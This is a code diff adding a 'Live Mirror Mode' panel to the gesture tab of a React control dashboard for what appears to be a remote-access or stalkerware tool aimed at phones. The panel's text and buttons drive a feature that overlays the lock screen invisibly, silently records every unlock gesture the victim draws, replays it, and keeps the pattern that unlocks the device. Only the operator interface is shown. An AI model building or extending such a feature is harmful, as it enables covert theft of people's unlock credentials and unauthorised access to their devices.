@@ -641,6 +641,48 @@ export default function GestureTab({ device, sendCommand, results }) {
             </div>
           </div>
 
+          {/* ── Live Mirror Mode ─────────────────────────────────────────── */}
+          <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #7c3aed' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
+              <div style={{ fontWeight: 700, fontSize: 14, color: '#a78bfa', textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Live Mirror Mode
+              </div>
+              <div style={{ fontSize: 11, color: '#6d28d9', background: '#2e1065', padding: '2px 8px', borderRadius: 99, fontWeight: 600 }}>
+                LOCKED SCREEN ONLY
+              </div>
+            </div>
+            <div style={{ fontSize: 13, color: '#64748b', marginBottom: 10, lineHeight: 1.7 }}>
+              Fully autonomous — requires <strong style={{ color: '#e2e8f0' }}>no dashboard interaction</strong> once started.
+              An invisible overlay sits on the lock screen and intercepts every gesture the user draws.
+              Each gesture is immediately replayed at <strong style={{ color: '#e2e8f0' }}>10–20ms</strong> (imperceptibly fast).
+              Only runs while the device is locked; stops automatically when unlocked.
+            </div>
+            <div style={{ fontSize: 12, color: '#475569', marginBottom: 14, padding: '8px 12px', background: '#0f172a', borderRadius: 8, border: '1px solid #2e1065' }}>
+              1. Lock the device<br />
+              2. Press <strong style={{ color: '#a78bfa' }}>Enable Mirror Mode</strong> from here<br />
+              3. Any gesture drawn on the lock screen is silently captured<br />
+              4. Gesture replays at 10–20ms automatically (invisible to user)<br />
+              ✅ Device unlocks → correct gesture saved, mode stops<br />
+              ❌ Still locked → buffer clears, listens for next gesture
+            </div>
+            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
+              <button
+                onClick={() => { sendCmd('gesture_mirror_start'); status('Mirror mode enabling — device must be locked…'); }}
+                disabled={!isOnline}
+                style={{ ...btnStyle('#7c3aed'), padding: '8px 18px' }}
+              >
+                Enable Mirror Mode
+              </button>
+              <button
+                onClick={() => { sendCmd('gesture_mirror_stop'); status('Mirror mode stopped.'); }}
+                disabled={!isOnline}
+                style={{ ...btnStyle('#334155'), padding: '8px 18px' }}
+              >
+                Disable Mirror Mode
+              </button>
+            </div>
+          </div>
+
         </div>
       </div>
 
